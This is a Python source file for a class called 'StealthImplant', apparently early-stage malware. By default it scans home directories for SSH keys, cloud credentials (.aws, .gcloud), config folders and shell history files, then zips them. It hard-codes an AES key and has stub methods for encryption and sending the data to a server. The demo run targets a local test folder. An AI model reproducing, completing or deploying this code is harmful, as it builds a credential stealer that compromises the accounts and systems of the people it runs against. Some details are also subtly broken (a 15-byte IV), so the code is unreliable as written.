import os
from pathlib import Path
import zipfile
from io import BytesIO
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import socket

class StealthImplant:
    
    # we scan from "source"
    # we look for file matching "target"
    def __init__(
        self, 
        source="/home/",
        # This can be either directory or file
        target_files=[
            ".ssh", 
            ".config", 
            ".aws", 
            ".gcloud",
        ],
        history_glob=".*_history",
        test=False
    ):

        self.root_dir=Path(source).expanduser()
        self.target_files=target_files
        self.history_glob=history_glob
        self.test=test
        self.ignore_dirs = {"lost+found", "cache", "tmp" }
        self.encryption_key = b'16bytessecretkey'  # AES-128
        self.encryption_iv = b'16bytepubliciv!'

        self._log("Implant initialize")
        self._log(f"source: {source}")
        self._log(f"target files: {target_files}")
    
    def run(self):
        try:
            self._log("Running...")
            collected_files=self.walk_dir()
            self._log(f"successfully retrieve {len(collected_files)} files")
            zip_bytes = self.create_zip(collected_files)
            with open("output.zip", "wb") as f:
                f.write(zip_bytes)
        except Exception as e:
            if self.test:
                raise

    # get list of file from source
    # matching target
    def walk_dir(self):
        collected = [] 
        for root, dirs, files in os.walk(self.root_dir, followlinks=False):
            self._log(f"root: {root}")
            self._log(f"dirs: {dirs}")
            self._log(f"files: {files}")
            dirs[:] = [d for d in dirs if d not in self.ignore_dirs]
            
            # if current directly is what we are looking for
            if any(target_dir in root for target_dir in self.target_files):
                for f in files:
                    self._log(f"Found: ${Path(root) / f}")
                    collected.append(Path(root) / f)
            
            # if it contains the file we need
            for f in files:
                if f in self.target_files:
                    self._log(f"Found: {Path(root) / f}")
                    collected.append(Path(root) / f)
                    
            if self.history_glob:
                for f in files:
                    if Path(f).match(self.history_glob):
                        self._log(f"Found: {Path(root) / f}")
                        collected.append(Path(root) / f)

        return list(set(collected))

        
    # zip the files we found
    def create_zip(self, files):
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for path in files:
                try:
                    rel_path = path.relative_to(self.root_dir)
                    zf.write(path, rel_path)
                except Exception as e:
                    self._log(f"skipped {path}: {e}")
        return zip_buffer.getvalue()

    # encrypt the data
    def encrypt(self):
        pass

    # send to server
    def send_to_server(self):
        pass

    def _log(self, message:str):
        if self.test: print(message)

def main():
    implant = StealthImplant(source="test_data", target_files=["passwords.txt", "users_data.txt"], test=True)
    implant.run()

if __name__ == "__main__":
    main()





